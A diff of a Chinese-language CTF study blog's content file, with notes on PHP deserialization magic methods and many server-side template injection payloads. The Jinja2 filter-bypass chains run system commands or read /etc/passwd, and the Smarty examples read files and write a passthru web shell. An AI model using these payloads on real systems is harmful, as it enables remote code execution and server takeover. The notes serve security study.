-    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span>
-<span class="function">    </span>&#123;
-        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$arg1</span>,<span class="subst">$arg2</span>[0]&quot;</span>;
-    &#125;
-
-&#125;
-<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();
-<span class="variable">$test</span>-&gt;<span class="title function_ invoke__">callxxx</span>(<span class="string">&#x27;a&#x27;</span>);
-<span class="meta">?&gt;</span>
-<span class="comment">//callxxx,a</span></code></pre>
-
-<pre><code class="highlight php"><span class="meta">&lt;?php</span>
-<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;
-
-    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span>
-<span class="function">    </span>&#123;
-        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$arg1</span>,<span class="subst">$arg2</span>[0]&quot;</span>;
-    &#125;
-
-&#125;
-<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();
-<span class="variable">$test</span>::<span class="title function_ invoke__">callxxx</span>(<span class="string">&#x27;a&#x27;</span>);
-<span class="meta">?&gt;</span>
-<span class="comment">//callxxx,a</span></code></pre>
-
-<p>这里先来学习一下双冒号的用法，双冒号也叫做范围解析操作符（也可称作 Paamayim Nekudotayim）或者更简单地说是一对冒号，可以用于访问静态成员，类常量，还可以用于覆盖类中的属性和方法。自 PHP 5.3.0 起，可以通过变量来引用类，该变量的值不能是关键字（如 self，parent 和 static）。与**__call<strong>不同的是需要添加</strong>static**，只有访问不存在的静态方法才会触发。</p>
-<h3 id="clone"><a href="#clone" class="headerlink" title="__clone()"></a><code>__clone()</code></h3><p><code>__clone()</code>:当使用clone关键字拷贝完成一个对象后，新对象就会调用定义的魔术方法(如果存在)</p>
-<pre><code class="highlight php"><span class="meta">&lt;?php</span>
-<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;
-
-    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span>
-<span class="function">    </span>&#123;
-        <span class="keyword">echo</span> <span class="string">&quot;__clone test&quot;</span>;
-    &#125;
-
-&#125;
-<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();
-<span class="variable">$newclass</span> = <span class="keyword">clone</span>(<span class="variable">$test</span>);
-<span class="meta">?&gt;</span>
-<span class="comment">//__clone test</span></code></pre>
-
-
-
-<h3 id="isset-和-unset"><a href="#isset-和-unset" class="headerlink" title="__isset()和__unset"></a><code>__isset()</code>和<code>__unset</code></h3><p><code>__isset()</code>:对不可访问属性调用<code>isset()</code>或者<code>empty()</code>时，<code>__isset()</code>会被调用</p>
-<p><code>__unset()</code>:对不可访问属性调用<code>unset()</code>时，<code>__unset()</code>会被触发</p>
-<pre><code class="highlight php"><span class="meta">&lt;?php</span>
-<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;
-    <span class="keyword">private</span> <span class="variable">$var</span>;
-    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$arg1</span></span>)</span>
-<span class="function">    </span>&#123;
-        <span class="keyword">echo</span> <span class="variable">$arg1</span>;
-    &#125;
-
-&#125;
-<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();
-<span class="keyword">isset</span>(<span class="variable">$test</span>-&gt;var1);
-<span class="meta">?&gt;</span>
-    <span class="comment">//var1</span></code></pre>
-
-<pre><code class="highlight php"><span class="meta">&lt;?php</span>
-<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;
-    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$arg1</span></span>)</span>
-<span class="function">    </span>&#123;
-        <span class="keyword">echo</span> <span class="variable">$arg1</span>;
-    &#125;
-
-&#125;
-<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();
-<span class="keyword">unset</span>(<span class="variable">$test</span>-&gt;var1);
-<span class="meta">?&gt;</span>
-    <span class="comment">//var1</span></code></pre>
-
-
-
-<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="绕过-wakeup"><a href="#绕过-wakeup" class="headerlink" title="绕过 __wakeup:"></a>绕过 __wakeup:</h3><ul>
-<li>PHP5 &lt; 5.6.25</li>
-<li>PHP7 &lt; 7.0.10</li>
+<p>如<code>request.args.[变量名](get传参) request.cookies.[变量名](cookies传参)</code></p>
+<ul>
+<li>使用切片将逆置的关键字顺序输出，进而达到绕过。</li>
 </ul>
-<p>当序列化后对象的参数列表中成员个数和实际个数不符合时会绕过 __wakeup()</p>
-<p>&#x2F;&#x2F;详见[SWPUCTF 2021 新生赛]no_wakeup</p>
-<p>当然，也可以通过赋值来绕过__wake下面将执行的字符串置空的情况</p>
-<p>使另一个构造好的变量和被控制的变量公用一个内存如</p>
-<pre><code class="highlight plaintext">$t-&gt;c=&quot;system(&#x27;ls /&#x27;);&quot;;
-$t-&gt;b=&amp;$t-&gt;a;
-//a未被wakeup置空的变量，执行的也是a,前面还有一个c-&gt;b的过程</code></pre>
+<pre><code class="highlight plaintext">&quot;&quot;[&quot;__cla&quot;&quot;ss__&quot;]
+&quot;&quot;.__getattribute__(&quot;__cla&quot;&quot;ss__&quot;)</code></pre>
 
+<ul>
+<li>反转</li>
+</ul>
+<pre><code class="highlight plaintext">&quot;&quot;[&quot;__ssalc__&quot;][::-1]
+&quot;&quot;.__getattribute__(&quot;__ssalc__&quot;[::-1])</code></pre>
 
+<ul>
+<li>利用”+”进行字符串拼接，绕过关键字过滤。</li>
+</ul>
+<pre><code class="highlight plaintext">&#123;&#123;()[&#x27;__cla&#x27;+&#x27;ss__&#x27;].__bases__[0].__subclasses__()[40].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;ev&#x27;+&#x27;al&#x27;](&quot;__im&quot;+&quot;port__(&#x27;o&#x27;+&#x27;s&#x27;).po&quot;&quot;pen(&#x27;whoami&#x27;).read()&quot;)&#125;&#125;
+[][%27__cla%27+%27ss__%27][%27__ba%27+%27se__%27][%27__subcl%27+%27asses__%27]()[117][&quot;__in&quot;+&quot;it__&quot;][&quot;__glo&quot;+&quot;bals__&quot;][&#x27;popen&#x27;](&#x27;ls /&#x27;).read()</code></pre>
 
-<h3 id="绕过-O"><a href="#绕过-O" class="headerlink" title="绕过 O"></a>绕过 O</h3><p>有时会对构造的payload进行正则匹配</p>
-<p>此时需要绕过一些必须绕过的关键词，如O</p>
-<p>gc机制</p>
-<h2 id="构链经验"><a href="#构链经验" class="headerlink" title="构链经验:"></a>构链经验:</h2><p>首先，找到注入点，注入点一般 被包裹在最内部(因为第一个执行，通过各种魔术方法将结果成功传输到外部并成功销毁对象)，接着内层的魔术方法要在紧邻的外层得到触发，(也就是为什么他被称为pop链的缘故)，最后成功销毁就算pop链构造成功了</p>
-<h2 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h2>]]></content>
+<ul>
+<li>join拼接</li>
+</ul>
+<p>利用join（）函数绕过关键字过滤</p>
+<pre><code class="highlight plaintext">&#123;&#123;[].__class__.__base__.__subclasses__()[40](&quot;fla&quot;.join(&quot;/g&quot;)).read()&#125;&#125;</code></pre>
+
+<ul>
+<li>利用引号绕过</li>
+</ul>
+<pre><code class="highlight plaintext">[&#123;&#123;[].__class__.__base__.__subclasses__()40&quot;/fl&quot;&quot;ag&quot;.read()&#125;&#125;]()</code></pre>
+
+<ul>
+<li>使用str原生函数replace替换</li>
+</ul>
+<p>将额外的字符拼接进原本的关键字里面，然后利用replace函数将其替换为空。</p>
+<pre><code class="highlight plaintext">&#123;&#123;().__getattribute__(&#x27;__claAss__&#x27;.replace(&quot;A&quot;,&quot;&quot;)).__bases__[0].__subclasses__()[376].__init__.__globals__[&#x27;popen&#x27;](&#x27;whoami&#x27;).read()&#125;&#125;</code></pre>
+
+<ul>
+<li>ascii转换</li>
+</ul>
+<pre><code class="highlight plaintext">将每一个字符都转换为ascii值后再拼接在一起。
+
+&quot;&#123;0:c&#125;&quot;.format(97)=&#x27;a&#x27;
+&quot;&#123;0:c&#125;&#123;1:c&#125;&#123;2:c&#125;&#123;3:c&#125;&#123;4:c&#125;&#123;5:c&#125;&#123;6:c&#125;&#123;7:c&#125;&#123;8:c&#125;&quot;.format(95,95,99,108,97,115,115,95,95)=&#x27;__class__&#x27;</code></pre>
+
+<ul>
+<li>16进制编码绕过</li>
+</ul>
+<pre><code class="highlight plaintext">&quot;__class__&quot;==&quot;\x5f\x5fclass\x5f\x5f&quot;==&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;
+
+例子：
+&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f&#x27;](&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&#125;&#125;
+\
+同理，也可使用八进制编码绕过</code></pre>
+
+<ul>
+<li><p>base64编码绕过</p>
+<p>对于python2，可利用base64进行绕过，对于python3没有decode方法，不能使用该方法进行绕过。</p>
+</li>
+</ul>
+<pre><code class="highlight plaintext">&quot;__class__&quot;==(&quot;X19jbGFzc19f&quot;).decode(&quot;base64&quot;)</code></pre>
+
+<p>例子：</p>
+<pre><code class="highlight plaintext">&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;X19idWlsdGluc19f&#x27;.decode(&#x27;base64&#x27;)][&#x27;ZXZhbA==&#x27;.decode(&#x27;base64&#x27;)](&#x27;X19pbXBvcnRfXygib3MiKS5wb3BlbigibHMgLyIpLnJlYWQoKQ==&#x27;.decode(&#x27;base64&#x27;))&#125;&#125;  
+等价于  
+&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;</code></pre>
+
+<ul>
+<li>unicode编码绕过</li>
+</ul>
+<pre><code class="highlight jinja2">&#123;%print((((lipsum|attr(&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;))|attr(&quot;\u0067\u0065\u0074&quot;)(&quot;os&quot;))|attr(&quot;\u0070\u006f\u0070\u0065\u006e&quot;)(&quot;\u0074\u0061\u0063\u0020\u002f\u0066\u002a&quot;))|attr(&quot;\u0072\u0065\u0061\u0064&quot;)())%&#125;
+等同于lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;tac /f*&#x27;).read()</code></pre>
+
+<ul>
+<li>Hex编码绕过</li>
+</ul>
+<pre><code class="highlight jinja2">[&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f&#x27;][&#x27;\x65\x76\x61\x6c&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;]()
+&#123;#温馨提示，连关键词都转换掉是有概率褒姒的，推荐用来绕过一下符号的过滤差不多够用了#&#125;
+
+&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#x27;\x6f\x73&#x27;].popen(&#x27;\x6c\x73\x20\x2f&#x27;).read()&#125;&#125;   
+等价于   
+&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;
+
+&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;</code></pre>
+
+<ul>
+<li>绕过i<strong>nit</strong><br>可以用<code>__enter__</code>或<code>__exit__</code>替代<code>__init__</code></li>
+</ul>
+<pre><code class="highlight plaintext">&#123;().__class__.__bases__[0].__subclasses__()[213].__enter__.__globals__[&#x27;__builtins__&#x27;][&#x27;open&#x27;](&#x27;/etc/passwd&#x27;).read()&#125;&#125;</code></pre>
+
+<pre><code class="highlight plaintext">&#123;&#123;().__class__.__bases__[0].__subclasses__()[213].__exit__.__globals__[&#x27;__builtins__&#x27;][&#x27;open&#x27;](&#x27;/etc/passwd&#x27;).read()&#125;&#125;</code></pre>
+
+<h4 id="打马环节-待补完"><a href="#打马环节-待补完" class="headerlink" title="打马环节(待补完)"></a>打马环节(待补完)</h4><h2 id="PHP模板注入"><a href="#PHP模板注入" class="headerlink" title="PHP模板注入"></a>PHP模板注入</h2><p>php常见的模板：twig，smarty，blade</p>
+<h3 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a>Smarty</h3><p>PHP模板的鼻祖，后来的php模板大多都是基于其发展起来的</p>
+<p>基本确定指令</p>
+<pre><code class="highlight php">&#123;<span class="variable">$smarty</span>.version&#125; <span class="comment">//查看smarty的版本来确定姿势</span></code></pre>
+
+<p>说实话，smarty的姿势还是蛮多的，先给三种比较常见的吧</p>
+<ul>
+<li><p>基于XFF的普通注入:在{}内疯狂输出</p>
+</li>
+<li><p>利用{include}来任意文件读取；string:{include file&#x3D;’D:\flag.txt’}这时文本内容就被读取了</p>
+</li>
+</ul>
+<h4 id="通过self获取Smarty类再调用其静态方法"><a href="#通过self获取Smarty类再调用其静态方法" class="headerlink" title="通过self获取Smarty类再调用其静态方法"></a><strong>通过self获取Smarty类再调用其静态方法</strong></h4><p><strong>getStreamVariable:</strong></p>
+<pre><code class="highlight php"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getStreamVariable</span>(<span class="params"><span class="variable">$variable</span></span>)//<span class="title">variable</span>其实就是文件路径</span>
+<span class="function"></span>&#123;
+        <span class="variable">$_result</span> = <span class="string">&#x27;&#x27;</span>;
+        <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$variable</span>, <span class="string">&#x27;r+&#x27;</span>);<span class="comment">//从此处开始对文件进行读取</span>
+        <span class="keyword">if</span> (<span class="variable">$fp</span>) &#123;
+            <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>) &amp;&amp; (<span class="variable">$current_line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>)) !== <span class="literal">false</span>) &#123;
+                <span class="variable">$_result</span> .= <span class="variable">$current_line</span>;
+            &#125;
+            <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);
+            <span class="keyword">return</span> <span class="variable">$_result</span>;
+        &#125;
+        <span class="variable">$smarty</span> = <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;smarty) ? <span class="variable language_">$this</span>-&gt;smarty : <span class="variable language_">$this</span>;
+        <span class="keyword">if</span> (<span class="variable">$smarty</span>-&gt;error_unassigned) &#123;
+            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SmartyException</span>(<span class="string">&#x27;Undefined stream variable &quot;&#x27;</span> . <span class="variable">$variable</span> . <span class="string">&#x27;&quot;&#x27;</span>);
+        &#125; <span class="keyword">else</span> &#123;
+            <span class="keyword">return</span> <span class="literal">null</span>;
+        &#125;
+    &#125;
+<span class="comment">//可以看到这个方法可以读取一个文件并返回其内容，所以我们可以用self来获取Smarty对象并调用这个方法</span>
+smarty/libs/sysplugins/smarty_internal_data.php　　——&gt;　　<span class="title function_ invoke__">getStreamVariable</span>() 这个方法可以获取传入变量的流
+例如：
+&#123;<span class="built_in">self</span>::<span class="title function_ invoke__">getStreamVariable</span>(<span class="string">&quot;file:///etc/passwd&quot;</span>)&#125;</code></pre>
+
+<p>payload形如：<code>&#123;self::getStreamVariable(“file:///etc/passwd”)&#125;</code> &#x2F;&#x2F;在v3.1.30退出历史舞台</p>
+<p><strong>writeFile：</strong></p>
+<p>这个不是很懂，直接引用这个大佬的博客吧</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250307213236244.png" alt="image-20250307213236244"></p>
+<pre><code class="highlight php"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">writeFile</span>(<span class="params"><span class="variable">$_filepath</span>, <span class="variable">$_contents</span>, Smarty <span class="variable">$smarty</span></span>)</span>
+<span class="function">    </span>&#123;
+        <span class="variable">$_error_reporting</span> = <span class="title function_ invoke__">error_reporting</span>();
+        <span class="title function_ invoke__">error_reporting</span>(<span class="variable">$_error_reporting</span> &amp; ~E_NOTICE &amp; ~E_WARNING);
+        <span class="variable">$_file_perms</span> = <span class="title function_ invoke__">property_exists</span>(<span class="variable">$smarty</span>, <span class="string">&#x27;_file_perms&#x27;</span>) ? <span class="variable">$smarty</span>-&gt;_file_perms : <span class="number">0644</span>;
+        <span class="variable">$_dir_perms</span> = <span class="title function_ invoke__">property_exists</span>(<span class="variable">$smarty</span>, <span class="string">&#x27;_dir_perms&#x27;</span>) ? (<span class="keyword">isset</span>(<span class="variable">$smarty</span>-&gt;_dir_perms) ? <span class="variable">$smarty</span>-&gt;_dir_perms : <span class="number">0777</span>)  : <span class="number">0771</span>;
+        <span class="keyword">if</span> (<span class="variable">$_file_perms</span> !== <span class="literal">null</span>) &#123;
+            <span class="variable">$old_umask</span> = <span class="title function_ invoke__">umask</span>(<span class="number">0</span>);
+        &#125;
+
+        <span class="variable">$_dirpath</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$_filepath</span>);
+        <span class="comment">// if subdirs, create dir structure</span>
+        <span class="keyword">if</span> (<span class="variable">$_dirpath</span> !== <span class="string">&#x27;.&#x27;</span> &amp;&amp; !<span class="title function_ invoke__">file_exists</span>(<span class="variable">$_dirpath</span>)) &#123;
+            <span class="title function_ invoke__">mkdir</span>(<span class="variable">$_dirpath</span>, <span class="variable">$_dir_perms</span>, <span class="literal">true</span>);
+        &#125;
+
+        <span class="comment">// write to tmp file, then move to overt file lock race condition</span>
+        <span class="variable">$_tmp_file</span> = <span class="variable">$_dirpath</span> . DS . <span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;,&#x27;</span>), <span class="string">&#x27;_&#x27;</span>, <span class="title function_ invoke__">uniqid</span>(<span class="string">&#x27;wrt&#x27;</span>, <span class="literal">true</span>));
+        <span class="keyword">if</span> (!<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_tmp_file</span>, <span class="variable">$_contents</span>)) &#123;
+            <span class="title function_ invoke__">error_reporting</span>(<span class="variable">$_error_reporting</span>);
+            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SmartyException</span>(<span class="string">&quot;unable to write file <span class="subst">&#123;$_tmp_file&#125;</span>&quot;</span>);
+       &#125;</code></pre>
+
+<p>我们在往上面看，可以看到这个方法是在<code>class Smarty_Internal_Runtime_WriteFile</code>下的，</p>
+<p>我们注意看这段代码</p>
+<pre><code class="highlight php"><span class="keyword">if</span> (!<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_tmp_file</span>, <span class="variable">$_contents</span>)) &#123;
+            <span class="title function_ invoke__">error_reporting</span>(<span class="variable">$_error_reporting</span>);
+            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SmartyException</span>(<span class="string">&quot;unable to write file <span class="subst">&#123;$_tmp_file&#125;</span>&quot;</span>);
+       &#125;</code></pre>
+
+<p>这段代码将文件内容写入临时文件，如果写入失败，则恢复先前的错误报告级别，并抛出异常。</p>
+<p>这里的具体解释我会在下面的CVE-2017-1000480具体讲到，先挖个坑，这里写入临时文件，在loadCompiledTemplate函数下，存在语句</p>
+<pre><code class="highlight php"><span class="keyword">eval</span>(<span class="string">&quot;?&gt;&quot;</span> . <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filepath));</code></pre>
+
+<p>就有了</p>
+<pre><code class="highlight php">&#123;<span class="title class_">Smarty_Internal_Write_File</span>::<span class="title function_ invoke__">writeFile</span>(<span class="variable">$SCRIPT_NAME</span>,<span class="string">&quot;&lt;?php passthru(<span class="subst">$_GET</span>[&#x27;cmd&#x27;]); ?&gt;&quot;</span>,<span class="built_in">self</span>::<span class="title function_ invoke__">clearConfig</span>())&#125;</code></pre>
+
+<p>我们将<code>&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;</code>写入了临时php文件中</p>
+<p><code>self::clearConfig()</code> 是一个 Smarty 内部方法，用于清除模板引擎的配置选项。</p>
+<p><code>$SCRIPT_NAME</code> 是一个在 PHP 中预定义的变量，用于表示当前执行脚本的文件路径和名称。</p>
+<p>但是writeFile方法也有版本限制，所以我们首先要确定模板的版本，再决定对应的攻击方法。</p>
+<h4 id="标签"><a href="#标签" class="headerlink" title="标签:"></a>标签:</h4><p><strong>{$smarty.version}</strong></p>
+<p>获取smarty的版本信息</p>
+<p><strong>{literal}</strong></p>
+<p>此标签的利用方法仅仅是在php5.x的版本中才可以使用，因为在 PHP5 环境下存在一种 PHP 标签， <code>&lt;script&gt;language=&quot;php&quot;&gt;&lt;/script&gt;，</code>我们便可以利用这一标签进行任意的 PHP 代码执行。但是在php7的版本中<code>&#123;literal&#125;xxxx;&#123;/literal&#125;</code>标签中间的内容就会被原封不动的输出，并不会解析。</p>
+<p>作用：{literal} 可以让一个模板区域的字符原样输出。这经常用于保护页面上的Javascript或css样式表，避免因为 Smarty 的定界符而错被解析。</p>
+<p>所以我们就可以利用其的作用来进行xss攻击SSTI等漏洞利用。</p>
+<pre><code class="highlight php">&#123;literal&#125;&lt;script&gt;language=<span class="string">&quot;php&quot;</span>&gt;xxx&lt;/script&gt;;&#123;/literal&#125;</code></pre>
+
+<p><strong>{php}{&#x2F;php}</strong></p>
+<p>用于执行php代码</p>
+<pre><code class="highlight php">&#123;php&#125;<span class="title function_ invoke__">phpinfo</span>();&#123;/php&#125;</code></pre>
+
+<p>但是这个方法在Smarty3版本中已经被禁用了，不过多赘述了。</p>
+<p><strong>{if}{&#x2F;if}</strong></p>
+<pre><code class="highlight php">&#123;<span class="keyword">if</span> <span class="title function_ invoke__">phpinfo</span>()&#125;&#123;/<span class="keyword">if</span>&#125;
+&#123;<span class="keyword">if</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;
+<span class="comment">//Smarty的&#123;if&#125;条件判断和PHP的if非常相似，只是增加了一些特性。每个&#123;if&#125;必须有一个配对的&#123;/if&#125;，也可以使用&#123;else&#125; 和 &#123;elseif&#125;，全部的PHP条件表达式和函数都可以在if内使用，如||*, or, &amp;&amp;, and, is_array(), 等等，如：&#123;if is_array($array)&#125;&#123;/if&#125;*</span></code></pre>
+
+<h3 id="twig"><a href="#twig" class="headerlink" title="twig"></a>twig</h3>]]></content>
       <tags>
-        <tag>-web -CTF</tag>
+        <tag>-CTF -Web</tag>
       </tags>
   </entry>
   <entry>
@@ -1953,7 +2348,12 @@ Cookie: PHPSESSID=636174202f666c6167</code></pre>
   <entry>
     <title>ThinkPHP历代版本漏洞复现</title>
     <url>/2025/04/14/ThinkPHP%E5%8E%86%E4%BB%A3%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h1 id="ThinkPHP历代版本漏洞复现"><a href="#ThinkPHP历代版本漏洞复现" class="headerlink" title="ThinkPHP历代版本漏洞复现"></a>ThinkPHP历代版本漏洞复现</h1><h2 id="ThinkPHP-2-x-RCE"><a href="#ThinkPHP-2-x-RCE" class="headerlink" title="ThinkPHP 2.x RCE"></a>ThinkPHP 2.x RCE</h2><p>是个preg_replace的漏洞，具体原理其实不大懂，后面自己的理解大概会补。？</p>
+    <content><![CDATA[<h1 id="ThinkPHP历代版本漏洞复现-未补完"><a href="#ThinkPHP历代版本漏洞复现-未补完" class="headerlink" title="ThinkPHP历代版本漏洞复现(未补完)"></a>ThinkPHP历代版本漏洞复现(未补完)</h1><p>校赛遇到一道PHP5.0.23版本的rce漏洞,复现完想着把整个这系列的洞都打一下</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250416142405466.png" alt="image-20250416142405466"></p>
+<h2 id="ThinkPHP-2-x-RCE"><a href="#ThinkPHP-2-x-RCE" class="headerlink" title="ThinkPHP 2.x RCE"></a>ThinkPHP 2.x RCE</h2><p>这个版本下有个preg_replace的e模式匹配漏洞</p>
+<pre><code class="highlight php"><span class="variable">$res</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;@(\w+)&#x27;</span>.<span class="variable">$depr</span>.<span class="string">&#x27;([^&#x27;</span>.<span class="variable">$depr</span>.<span class="string">&#x27;\/]+)@e&#x27;</span>, <span class="string">&#x27;$var[\&#x27;\\1\&#x27;]=&quot;\\2&quot;;&#x27;</span>, <span class="title function_ invoke__">implode</span>(<span class="variable">$depr</span>,<span class="variable">$paths</span>));</code></pre>
+
+<p>具体原理其实不大懂，后面自己的理解大概会补。？</p>
 <p>先把洞打穿吧</p>
 <p>这里贴一下BUU的题目</p>
 <p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250414191818633.png" alt="image-20250414191818633"></p>
@@ -1993,570 +2393,6 @@ POST: _method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_
 ]]></content>
       <tags>
         <tag>-PHP -Web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SSTI漏洞</title>
-    <url>/2025/01/22/SSTI%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h1 id="SSTI（模板注入）漏洞"><a href="#SSTI（模板注入）漏洞" class="headerlink" title="SSTI（模板注入）漏洞"></a>SSTI（模板注入）漏洞</h1><p>模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，利用模板引擎来生成前端的html代码，模板引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模板+用户数据的前端html页面，然后反馈给浏览器，呈现在用户面前。</p>
-<p>模板引擎也会提供沙箱机制来进行漏洞防范，但是可以用沙箱逃逸技术来进行绕过。</p>
-<h2 id="模板注入漏洞"><a href="#模板注入漏洞" class="headerlink" title="模板注入漏洞"></a>模板注入漏洞</h2><p>SSTI 就是服务器端模板注入（Server-Side Template Injection）</p>
-<p>当前使用的一些框架，比如python的<code>flask</code>，php的<code>tp</code>，java的<code>spring</code>等一般都采用成熟的的MVC的模式，用户的输入先进入Controller控制器，然后根据请求类型和请求的指令发送给对应Model业务模型进行业务逻辑判断，数据库存取，最后把结果返回给View视图层，经过模板渲染展示给用户。</p>
-<p>漏洞成因就是服务端接收了用户的恶意输入(一般来说是用户输入的变量)以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p>
-<p>凡是使用模板的地方都可能会出现 SSTI 的问题，SSTI 不属于任何一种语言，沙盒绕过也不是，沙盒绕过只是由于模板引擎发现了很大的安全漏洞，然后模板引擎设计出来的一种防护机制，不允许使用没有定义或者声明的模块，这适用于所有的模板引擎。</p>
-<h2 id="确定攻击方式"><a href="#确定攻击方式" class="headerlink" title="确定攻击方式"></a>确定攻击方式</h2><h3 id="第一层："><a href="#第一层：" class="headerlink" title="第一层："></a>第一层：</h3><ul>
-<li>如果可以执行${7*7}的结果，那我们进入第二层的<code>a&#123;*comment*&#125;b</code>，如果没用执行结果，那就进入第二层的<code>&#123;&#123;7*7&#125;&#125;</code></li>
-<li>在Mako模板引擎中我们也是${}形式的</li>
-</ul>
-<h3 id="第二层："><a href="#第二层：" class="headerlink" title="第二层："></a>第二层：</h3><ul>
-<li>在<code>a&#123;*comment*&#125;b</code>中，如果{**}被当作注释而输出ab，我们就可以确定这个地方是Smarty模板，如果不能，进入第三层；</li>
-<li>在<code>&#123;&#123;7*7&#125;&#125;</code>中，如果能够执行，那我们进入第三层。</li>
-</ul>
-<h3 id="第三层："><a href="#第三层：" class="headerlink" title="第三层："></a>第三层：</h3><ul>
-<li>当49的结果为49时，对应着Twig模板类型，而结果如果为7777777，则对应着Jinja2的模板类型</li>
-<li>当能够执行<code>$&#123;&quot;z&quot;.join(&quot;ab&quot;)&#125;</code>,我们就能确定是Mako模板，能够直接执行python命令.</li>
-</ul>
-<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><p>php常见的模板：twig，smarty，blade</p>
-<h3 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a>Smarty</h3><p>PHP模板的鼻祖，后来的php模板大多都是基于其发展起来的</p>
-<p>基本确定指令</p>
-<pre><code class="highlight php">&#123;<span class="variable">$smarty</span>.version&#125; <span class="comment">//查看smarty的版本来确定姿势</span></code></pre>
-
-<p>说实话，smarty的姿势还是蛮多的，先给三种比较常见的吧</p>
-<ul>
-<li><p>基于XFF的普通注入:在{}内疯狂输出</p>
-</li>
-<li><p>利用{include}来任意文件读取；string:{include file&#x3D;’D:\flag.txt’}这时文本内容就被读取了</p>
-</li>
-</ul>
